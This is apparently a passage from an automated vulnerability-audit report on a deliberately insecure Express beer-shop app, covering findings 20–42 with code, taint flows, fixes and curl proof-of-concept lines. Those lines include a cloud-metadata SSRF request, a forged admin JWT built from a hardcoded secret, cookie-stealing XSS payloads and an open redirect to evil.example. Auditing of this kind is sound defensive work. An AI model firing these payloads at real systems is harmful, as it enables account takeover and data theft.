app.post('/v1/admin/new-beer-xml/', upload.single('file'), async function (req, res) {
```
- Taint Flow:
  - **Source**: `unauthenticated multipart XML to /v1/admin/new-beer-xml/`
  - **Path**:
    - `src/router/routes/admin.js:83 unauthenticated entry`
    - `src/router/routes/admin.js:93 libxmljs.parseXml noent:true`
    - `src/router/routes/admin.js:100 db.beer.create`
  - **Sink**: `XXE parser + Sequelize create`
- Evidence: src/router/routes/admin.js:83 defines POST /v1/admin/new-beer-xml/ with only multer memoryStorage; no authentication/authorization check before libxmljs.parseXml noent:true and db.beer.create
  - Validation: src/router/routes/admin.js:83 POST /v1/admin/new-beer-xml/ registers only multer memoryStorage; src/router/routes/admin.js:93 parseXml noent:true reachable unauthenticated
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/admin.js:83 POST /v1/admin/new-beer-xml/ registers only multer memoryStorage; src/router/routes/admin.js:93 parseXml noent:true reachable unauthenticated | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Require admin auth before parsing and disable external entities (noent:false) or replace libxmljs with safe parser

<a id="finding-20"></a>
### HIGH Missing Authentication on GET /v1/order Exposes All Users and Beers
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.95
- Location: `src/router/routes/order.js:12-12`
- Vulnerable code (`src/router/routes/order.js`):
```javascript
app.get('/v1/order', (req,res) =>{
```
- Taint Flow:
  - **Source**: `unauthenticated network request`
  - **Path**:
    - `src/router/routes/order.js:12 unauthenticated GET`
    - `src/router/routes/order.js:15 res.json(beer)`
  - **Sink**: `JSON response disclosing all users/beers`
- Evidence: src/router/routes/order.js:12 route calls db.beer.findAll({include: users}) with no auth check; prior missing-auth list does not include this endpoint
  - Validation: src/router/routes/order.js:12 GET /v1/order has no auth; src/router/routes/order.js:13 findAll include users returned via res.json
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/order.js:12 GET /v1/order has no auth; src/router/routes/order.js:13 findAll include users returned via res.json | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Require authentication/authorization and minimize returned fields to exclude PII/passwords

<a id="finding-21"></a>
### HIGH SSRF in GET /v1/test
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-918 | confidence: 0.95
- Location: `src/router/routes/system.js:81-81`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
requests.get(url)
```
- Taint Flow:
  - **Source**: `req.query.url`
  - **Path**:
    - `req.query.url -> axios.get`
  - **Sink**: `axios GET to attacker URL`
- Evidence: requests.get(url)
  - Validation: src/router/routes/system.js:77 url=req.query.url + :81 requests.get(url) axios GET to attacker URL in unauth GET /v1/test/ with no allowlist
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:77 url=req.query.url + :81 requests.get(url) axios GET to attacker URL in unauth GET /v1/test/ with no allowlist | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/v1/test/?url=http://169.254.169.254/latest/meta-data/'
```
- Patch:
  - **Summary**: Allowlist destinations, block metadata/link-local, disable redirects or validate redirect hosts

<a id="finding-22"></a>
### HIGH Hardcoded JWT Secret in GET /v1/admin/users
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-798 | confidence: 0.95
- Location: `src/router/routes/user.js:18-18`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const user_object = jwt.verify(req.headers.authorization.split(' ')[1],"SuperSecret")
```
- Taint Flow:
  - **Source**: `req.headers.authorization`
  - **Path**:
    - `Authorization header -> jwt.verify hardcoded -> role check`
  - **Sink**: `admin authorization decision`
- Evidence: const user_object = jwt.verify(req.headers.authorization.split(' ')[1],"SuperSecret")
  - Validation: src/router/routes/user.js:18 jwt.verify(token,"SuperSecret") hardcoded; same secret signs at token/OTP handlers, enabling forged admin JWT for GET /v1/admin/users/
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:18 jwt.verify(token,"SuperSecret") hardcoded; same secret signs at token/OTP handlers, enabling forged admin JWT for GET /v1/admin/users/ | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
python3 -c "import jwt; print(jwt.encode({'id':1,'role':'admin'},'SuperSecret',algorithm='HS256'))"  # use as Bearer to GET /v1/admin/users/
```
- Patch:
  - **Summary**: Load strong random JWT secret from env/vault, verify signature + expiry, enforce admin role server-side

<a id="finding-23"></a>
### HIGH Hardcoded OTP Seed Default Enables OTP Prediction
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-798 | confidence: 0.95
- Location: `src/router/routes/user.js:395-395`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const seed = req.query.seed || "***";
```
- Taint Flow:
  - **Source**: `hardcoded default when seed omitted`
  - **Path**:
    - `src/router/routes/user.js:395 default seed`
  - **Sink**: `otplib generate/check and JWT sign`
- Evidence: src/router/routes/user.js:395 hardcoded OTP seed fallback; companion hardcoded JWT secret at line 404 uses same weak value (masked)
  - Validation: src/router/routes/user.js:395 seed defaults to 'SUPERSECUREOTP' when query omitted; src/router/routes/user.js:404 JWT signed with hardcoded "SuperSecret"
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:395 seed defaults to 'SUPERSECUREOTP' when query omitted; src/router/routes/user.js:404 JWT signed with hardcoded "SuperSecret" | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Remove hardcoded seed fallback; generate/store random per-user secret server-side and require it, move JWT secret to env with signature verification

<a id="finding-24"></a>
### HIGH Reflected XSS via |safe in user-register.html
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-79 | confidence: 0.95
- Location: `src/templates/user-register.html:139-139`
- Vulnerable code (`src/templates/user-register.html`):
```html
<p class="mb-4">{{message | safe}}</p>
```
- Taint Flow:
  - **Source**: `req.query.message`
  - **Path**:
    - `req.query.message -> renderString -> safe`
  - **Sink**: `unescaped reflection`
- Evidence: <p class="mb-4">{{message | safe}}</p>
  - Validation: src/router/routes/frontend.js:40-41 req.query.message via nunjucks.renderString(message) into res.render user-register.html; src/templates/user-register.html:139 {{message|safe}} disables escaping with no sanitization
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:40-41 req.query.message via nunjucks.renderString(message) into res.render user-register.html; src/templates/user-register.html:139 {{message|safe}} disables escaping with no sanitization | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/register?message=<script>alert(1)</script>'
```
- Patch:
  - **Summary**: Stop passing req.query.message through nunjucks.renderString and remove |safe; render message escaped by default.

<a id="finding-25"></a>
### HIGH Reflected XSS via |safe in user.html
- CVSS: **7.3** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-79 | confidence: 0.95
- Location: `src/templates/user.html:139-139`
- Vulnerable code (`src/templates/user.html`):
```html
<p class="mb-4">{{message | safe}}</p>
```
- Taint Flow:
  - **Source**: `req.query.message`
  - **Path**:
    - `req.query.message -> renderString -> {{message|safe}}`
  - **Sink**: `unescaped HTML reflection`
- Evidence: <p class="mb-4">{{message | safe}}</p>
  - Validation: src/router/routes/frontend.js:12-16 nunjucks.renderString(req.query.message) -> res.render user.html; src/templates/user.html:139 {{message|safe}} disables escaping enabling reflected XSS
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:12-16 nunjucks.renderString(req.query.message) -> res.render user.html; src/templates/user.html:139 {{message|safe}} disables escaping enabling reflected XSS | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/?message=<script>alert(document.cookie)</script>'  # reflected in <p>
```
- Patch:
  - **Summary**: Remove |safe, rely on autoescaping, and stop rendering raw query input via renderString (SSTI+XSS).

<a id="finding-26"></a>
### HIGH Missing Authentication on GET /v1/test SSRF Endpoint
- CVSS: **7.2** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-862 | confidence: 0.92
- Location: `src/router/routes/system.js:75-75`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
app.get('/v1/test/', (req,res) =>{
```
- Taint Flow:
  - **Source**: `unauthenticated query url`
  - **Path**:
    - `src/router/routes/system.js:77 req.query.url`
  - **Sink**: `axios GET + error reflection`
- Evidence: src/router/routes/system.js:75 GET /v1/test SSRF via axios with no auth, no allowlist, no rate limit; no route uses auth middleware
  - Validation: src/router/routes/system.js:75 GET /v1/test/ has no auth; src/router/routes/system.js:81 axios.get(req.query.url) with no allowlist
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:75 GET /v1/test/ has no auth; src/router/routes/system.js:81 axios.get(req.query.url) with no allowlist | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Require auth, enforce URL allowlist/egress rules, and stop reflecting raw error to client

<a id="finding-27"></a>
### HIGH Credentials in URL and Weak MD5 Storage in GET /registerform
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-523 | confidence: 0.9
- Location: `src/router/routes/frontend.js:68-68`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
const userPassword = req.query.password;
```
- Taint Flow:
  - **Source**: `req.query.email/password`
  - **Path**:
    - `req.query.password -> md5 -> db.user.create`
  - **Sink**: `credential in URL + weak hash storage`
- Evidence: const userPassword = req.query.password;
  - Validation: src/router/routes/frontend.js:68 const userPassword=req.query.password (GET credentials in URL) -> src/router/routes/frontend.js:86 password:md5(userPassword) weak unsalted hash stored
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:68 const userPassword=req.query.password (GET credentials in URL) -> src/router/routes/frontend.js:86 password:md5(userPassword) weak unsalted hash stored | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/registerform?email=a@b.com&password=secret123&name=x&address=y'  # password in URL/logs
```
- Patch:
  - **Summary**: Use POST body (never query) for credentials and store bcrypt/scrypt salted hash instead of MD5.

<a id="finding-28"></a>
### HIGH Broken Authentication Bypass in GET /login
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-287 | confidence: 0.9
- Location: `src/router/routes/frontend.js:122-122`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
if((user[0].password == userPassword) || (md5(user[0].password) == userPassword)){
```
- Taint Flow:
  - **Source**: `req.query.email/password`
  - **Path**:
    - `req.query.password vs stored hash comparison -> req.session.logged`
  - **Sink**: `authentication decision`
- Evidence: if((user[0].password == userPassword) || (md5(user[0].password) == userPassword)){
  - Validation: src/router/routes/frontend.js:125 if((user[0].password==userPassword)||(md5(user[0].password)==userPassword)) accepts hash-as-password with == over GET params; hashes exposed via src/router/routes/user.js:52 IDOR
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:125 if((user[0].password==userPassword)||(md5(user[0].password)==userPassword)) accepts hash-as-password with == over GET params; hashes exposed via src/router/routes/user.js:52 IDOR | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/login?email=victim@x.com&password=<stored-md5-or-plaintext>'  # bypass via hash equality
```
- Patch:
  - **Summary**: Use bcrypt compare via POST body, constant-time check, regenerate session, add rate-limiting

<a id="finding-29"></a>
### HIGH IDOR in GET /profile
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-639 | confidence: 0.9
- Location: `src/router/routes/frontend.js:148-148`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
id: req.query.id
```
- Taint Flow:
  - **Source**: `req.query.id`
  - **Path**:
    - `req.query.id -> findAll where id -> profile.html`
  - **Sink**: `profile disclosure`
- Evidence: id: req.query.id
  - Validation: src/router/routes/frontend.js:144-148 GET /profile with only if(!req.query.id) check then findAll where {id:req.query.id} and renders profile.html with user[0], no session/authz binding
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:144-148 GET /profile with only if(!req.query.id) check then findAll where {id:req.query.id} and renders profile.html with user[0], no session/authz binding | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/profile?id=1' ; curl 'http://localhost:5000/profile?id=2'  # horizontal access
```
- Patch:
  - **Summary**: Bind profile access to authenticated session user (or admin) and reject cross-user id lookup without authorization.

<a id="finding-30"></a>
### HIGH Excessive Data Exposure in GET /v1/order
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-200 | confidence: 0.9
- Location: `src/router/routes/order.js:13-13`
- Vulnerable code (`src/router/routes/order.js`):
```javascript
db.beer.findAll({include: "users"})
```
- Taint Flow:
  - **Source**: `no input needed; unauthenticated endpoint`
  - **Path**:
    - `db.beer.findAll include users -> res.json`
  - **Sink**: `res.json with PII/password hashes`
- Evidence: db.beer.findAll({include: "users"})
  - Validation: src/router/routes/order.js:12-13 unauthenticated GET /v1/order db.beer.findAll({include:"users"}) -> res.json leaks user rows incl password per src/entities/user.js password field
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/order.js:12-13 unauthenticated GET /v1/order db.beer.findAll({include:"users"}) -> res.json leaks user rows incl password per src/entities/user.js password field | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl http://localhost:5000/v1/order | grep -i password
```
- Patch:
  - **Summary**: Require auth and project only non-sensitive beer fields; exclude user.password/email/address from include attributes.

<a id="finding-31"></a>
### HIGH Cross-Unit Stored XSS: POST /v1/user/ address to GET /profile |safe
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-79 | confidence: 0.9
- Location: `src/router/routes/user.js:87-88`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const userAddress = req.body.address
```
- Taint Flow:
  - **Source**: `POST /v1/user/ req.body.address`
  - **Path**:
    - `src/router/routes/user.js:87 req.body.address`
    - `src/router/routes/user.js:101 db.user.create address`
    - `src/router/routes/frontend.js:144 GET /profile?id=`
    - `src/templates/profile.html:136 {{ user.address |safe }}`
  - **Sink**: `Nunjucks |safe unescaped HTML rendering`
- Evidence: src/router/routes/user.js:87 req.body.address stored via db.user.create; src/router/routes/frontend.js:144 GET /profile renders user[0] without output encoding; src/templates/profile.html:136 renders {{ user.address |safe }} unescaped
  - Validation: src/router/routes/user.js:87 req.body.address via db.user.create src/router/routes/user.js:101; src/router/routes/frontend.js:144 GET /profile renders user[0]; src/templates/profile.html:136 {{user.address|safe}} unescaped
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:87 req.body.address via db.user.create src/router/routes/user.js:101; src/router/routes/frontend.js:144 GET /profile renders user[0]; src/templates/profile.html:136 {{user.address|safe}} unescaped | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Remove |safe from profile.html and encode stored address; restrict address input and mass-assignment.

<a id="finding-32"></a>
### HIGH Broken Authorization Binding in POST /v1/love/:beer_id
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-287 | confidence: 0.9
- Location: `src/router/routes/user.js:182-182`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
current_user_id = jwt.decode(req.headers.authorization.split(' ')[1]).id
```
- Taint Flow:
  - **Source**: `req.query.id / Authorization header`
  - **Path**:
    - `req.query.id overwrites authenticated id -> addBeer`
  - **Sink**: `authorization decision`
- Evidence: current_user_id = jwt.decode(req.headers.authorization.split(' ')[1]).id
  - Validation: src/router/routes/user.js:174-187 POST /v1/love decodes jwt via jwt.decode without verify then unconditionally overwrites current_user_id=req.query.id, ignoring authenticated identity
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:174-187 POST /v1/love decodes jwt via jwt.decode without verify then unconditionally overwrites current_user_id=req.query.id, ignoring authenticated identity | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST 'http://localhost:5000/v1/love/1?id=2'  # succeeds as user 2 regardless of session
```
- Patch:
  - **Summary**: Derive current_user_id solely from verified session/JWT (jwt.verify) and remove req.query.id override.

<a id="finding-33"></a>
### HIGH Broken Login and User Enumeration in POST /v1/user/login
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-287 | confidence: 0.9
- Location: `src/router/routes/user.js:299-299`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
if((user[0].password == userPassword) || (md5(user[0].password) == userPassword)){
```
- Taint Flow:
  - **Source**: `req.body.email/password`
  - **Path**:
    - `req.body.password -> comparison -> res.json user`
  - **Sink**: `login decision + disclosure`
- Evidence: if((user[0].password == userPassword) || (md5(user[0].password) == userPassword)){
  - Validation: src/router/routes/user.js:299 flawed if((user[0].password==userPassword)||(md5(user[0].password)==userPassword)) with 404 vs 401 oracle and res.json(user) disclosing hash
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:299 flawed if((user[0].password==userPassword)||(md5(user[0].password)==userPassword)) with 404 vs 401 oracle and res.json(user) disclosing hash | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST http://localhost:5000/v1/user/login -H 'Content-Type: application/json' -d '{"email":"victim@x.com","password":"anything"}'  # observe 404 vs 401 oracle
```
- Patch:
  - **Summary**: Compare md5/bcrypt(input) to stored hash in constant time, return generic 401, and never return user/password hash.

<a id="finding-34"></a>
### HIGH Missing Rate Limiting on OTP Validation Enables Brute-Force
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-307 | confidence: 0.9
- Location: `src/router/routes/user.js:381-381`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
app.post('/v1/user/:id/validate-otp', (req,res) =>{
```
- Taint Flow:
  - **Source**: `query seed+token, no throttle`
  - **Path**:
    - `src/router/routes/user.js:395 req.query.seed`
    - `src/router/routes/user.js:398 otplib generate/check`
  - **Sink**: `JWT issuance on isValid`
- Evidence: src/router/routes/user.js:381 POST /v1/user/:id/validate-otp has no throttle, attacker controls seed and token; jsdoc admits lack of rate limiting
  - Validation: src/router/routes/user.js:381 POST /v1/user/:id/validate-otp performs otplib generate/check with no counter/throttle; src/server.js has no rate-limit middleware
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:381 POST /v1/user/:id/validate-otp performs otplib generate/check with no counter/throttle; src/server.js has no rate-limit middleware | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Add rate-limiting, per-account attempt counter with lockout/expiry, and do not echo GeneratedToken

<a id="finding-35"></a>
### HIGH Broken OTP Validation with Seed Control and Token Leak
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-308 | confidence: 0.9
- Location: `src/router/routes/user.js:393-404`
- Vulnerable code (`src/router/routes/user.js`):
```javascript
const seed = req.query.seed || 'SUPERSECUREOTP';
```
- Taint Flow:
  - **Source**: `req.query.seed/token`
  - **Path**:
    - `req.query.seed -> otplib.generate -> res.json leak + jwt.sign`
  - **Sink**: `OTP validation + JWT issuance`
- Evidence: const seed = req.query.seed || 'SUPERSECUREOTP';
  - Validation: src/router/routes/user.js:398 seed=req.query.seed||'SUPERSECUREOTP' attacker-controlled -> generate(seed); src/router/routes/user.js:421 leaks GeneratedToken in 401 and stores to req.session.otp enabling bypass via isValid||userToken==session.otp
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:398 seed=req.query.seed||'SUPERSECUREOTP' attacker-controlled -> generate(seed); src/router/routes/user.js:421 leaks GeneratedToken in 401 and stores to req.session.otp enabling bypass via isValid||userToken==session.otp | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X POST 'http://localhost:5000/v1/user/1/validate-otp?seed=attackerSeed&token=guess'  # error leaks GeneratedToken; replay via ?seed to set session otp
```
- Patch:
  - **Summary**: Use server-side secret seed per user, never accept seed from query, do not leak generated OTP, and rate-limit validation.

<a id="finding-36"></a>
### HIGH Insecure Session Configuration with Hardcoded Secret
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-614 | confidence: 0.9
- Location: `src/server.js:57-57`
- Vulnerable code (`src/server.js`):
```javascript
secret: 'SuperSecret',
```
- Taint Flow:
  - **Source**: `server configuration`
  - **Path**:
    - `hardcoded secret + insecure flags -> Set-Cookie`
  - **Sink**: `session cookie issuance`
- Evidence: secret: 'SuperSecret',
  - Validation: src/server.js:57 secret:'SuperSecret' hardcoded with src/server.js:37-43 cookie {secure:false,httpOnly:false} applied to all sessions via express-session
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/server.js:57 secret:'SuperSecret' hardcoded with src/server.js:37-43 cookie {secure:false,httpOnly:false} applied to all sessions via express-session | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -i http://localhost:5000/  # observe Set-Cookie: sessionID=... without HttpOnly; Secure
```
- Patch:
  - **Summary**: Load session secret from env (strong random), set httpOnly:true, secure:true, sameSite strict/lax appropriately.

<a id="finding-37"></a>
### HIGH Stored XSS via |safe in beer.html
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-79 | confidence: 0.9
- Location: `src/templates/beer.html:136-136`
- Vulnerable code (`src/templates/beer.html`):
```html
<span class="align-middle">Address: {{ user.address |safe }}</span>
```
- Taint Flow:
  - **Source**: `req.body.address / req.query.address`
  - **Path**:
    - `req.body.address -> db.user.address -> {{user.address|safe}}`
  - **Sink**: `unescaped stored reflection`
- Evidence: <span class="align-middle">Address: {{ user.address |safe }}</span>
  - Validation: src/router/routes/user.js:87 req.body.address persisted via db.user.create src/router/routes/user.js:96-102 and PUT src/router/routes/user.js:325 db.user.update(req.body); rendered unescaped at src/templates/beer.html:136 {{user.address|safe}} via src/router/routes/frontend.js:218
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:87 req.body.address persisted via db.user.create src/router/routes/user.js:96-102 and PUT src/router/routes/user.js:325 db.user.update(req.body); rendered unescaped at src/templates/beer.html:136 {{user.address|safe}} via src/router/routes/frontend.js:218 | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -X PUT http://localhost:5000/v1/user/1 -H 'Content-Type: application/json' -d '{"address":"<script>alert(1)</script>"}'  # then GET /beer?id=..
```
- Patch:
  - **Summary**: Remove |safe from beer.html address output and validate/encode address on write; avoid mass-assignment of raw req.body.

<a id="finding-38"></a>
### HIGH Stored XSS via |safe in profile.html
- CVSS: **7.1** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-79 | confidence: 0.9
- Location: `src/templates/profile.html:136-136`
- Vulnerable code (`src/templates/profile.html`):
```html
<span class="align-middle">Address: {{ user.address |safe }}</span>
```
- Taint Flow:
  - **Source**: `user.address`
  - **Path**:
    - `address input -> profile.html |safe`
  - **Sink**: `stored XSS`
- Evidence: <span class="align-middle">Address: {{ user.address |safe }}</span>
  - Validation: src/router/routes/user.js:87 req.body.address stored via db.user.create; src/router/routes/frontend.js:144 GET /profile loads by req.query.id and src/router/routes/frontend.js:164 renders profile.html; src/templates/profile.html:136 {{user.address|safe}} unescaped
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/user.js:87 req.body.address stored via db.user.create; src/router/routes/frontend.js:144 GET /profile loads by req.query.id and src/router/routes/frontend.js:164 renders profile.html; src/templates/profile.html:136 {{user.address|safe}} unescaped | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/registerform?email=x@x.com&password=p&name=x&address=<script>alert(1)</script>'  # then GET /profile?id=<id>
```
- Patch:
  - **Summary**: Remove |safe from profile.html address output and output-encode stored address.

<a id="finding-39"></a>
### HIGH IDOR and Reflected XSS in GET /beer via relationship
- CVSS: **6.9** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`) | CWE: CWE-639 | confidence: 0.85
- Location: `src/router/routes/frontend.js:212-212`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
love_message = req.query.relationship
```
- Taint Flow:
  - **Source**: `req.query.relationship/user/id`
  - **Path**:
    - `req.query.relationship -> love_message -> beer.html {{message}}`
  - **Sink**: `template render XSS + IDOR`
- Evidence: love_message = req.query.relationship
  - Validation: src/router/routes/frontend.js:180-212 GET /beer takes req.query.id/user without authz, discloses user[0]+beer and honors req.query.relationship override into render; src/templates/beer.html:190 renders message
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:180-212 GET /beer takes req.query.id/user without authz, discloses user[0]+beer and honors req.query.relationship override into render; src/templates/beer.html:190 renders message | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl 'http://localhost:5000/beer?id=1&user=2&relationship=<script>alert(1)</script>'
```
- Patch:
  - **Summary**: Enforce authz binding for id/user lookup and treat relationship as server-derived value, never raw query input.

<a id="finding-40"></a>
### MEDIUM Open Redirect in GET /v1/redirect
- CVSS: **4.9** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-601 | confidence: 0.95
- Location: `src/router/routes/system.js:37-37`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
res.redirect(url);
```
- Taint Flow:
  - **Source**: `req.query.url`
  - **Path**:
    - `req.query.url -> res.redirect`
  - **Sink**: `res.redirect to attacker URL`
- Evidence: res.redirect(url);
  - Validation: src/router/routes/system.js:33-37 var url=req.query.url then res.redirect(url) with no allowlist; mounted GET /v1/redirect/
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/system.js:33-37 var url=req.query.url then res.redirect(url) with no allowlist; mounted GET /v1/redirect/ | consensus: 1/1 confirmed
- Dynamic PoC: **ATTEMPTED** (in-container execution did not fully confirm)
  - Repro Script (`poc.py`):
```python
curl -v 'http://localhost:5000/v1/redirect/?url=https://evil.example/phish'
```
- Patch:
  - **Summary**: Allowlist redirect destinations (relative paths or known hosts) and reject absolute untrusted URLs.

<a id="finding-41"></a>
### MEDIUM Credentials in URL Query in GET /login
- CVSS: **4.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-598 | confidence: 0.9
- Location: `src/router/routes/frontend.js:110-112`
- Vulnerable code (`src/router/routes/frontend.js`):
```javascript
app.get('/login', (req,res) =>{
        var userEmail = req.query.email;
        var userPassword = req.query.password;
```
- Taint Flow:
  - **Source**: `user password supplied as GET query to /login`
  - **Path**:
    - `src/router/routes/frontend.js:112 req.query.password in URL`
    - `src/router/routes/frontend.js:125 plaintext/MD5 password comparison`
  - **Sink**: `URL query string, logs, history, Referer leakage`
- Evidence: src/router/routes/frontend.js:110-112 GET /login reads email and password from req.query; credentials appear in URL, browser history, proxy/server logs; distinct from reported /registerform credential-in-URL at frontend.js:68
  - Validation: src/router/routes/frontend.js:110 GET /login reads credentials; src/router/routes/frontend.js:111-112 req.query.email/password places password in URL
  - Consensus: 1/1 confirmed
  - Audit Trail: validator: src/router/routes/frontend.js:110 GET /login reads credentials; src/router/routes/frontend.js:111-112 req.query.email/password places password in URL | consensus: 1/1 confirmed
- Patch:
  - **Summary**: Change login to POST with credentials in body over TLS, never in query string/logs

<a id="finding-42"></a>
### MEDIUM Unhandled Exception Hanging Response DoS in GET /v1/status/:brand
- CVSS: **4.8** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`) | CWE: CWE-248 | confidence: 0.9
- Location: `src/router/routes/system.js:20-22`
- Vulnerable code (`src/router/routes/system.js`):
```javascript
catch (e){
            console.log(e)
        }
```
- Taint Flow:
  - **Source**: `unauthenticated GET /v1/status/:brand`
  - **Path**:
    - `src/router/routes/system.js:13 :brand path param`
    - `src/router/routes/system.js:17 execSync curl interpolation`
    - `src/router/routes/system.js:20 exception swallowed without response`
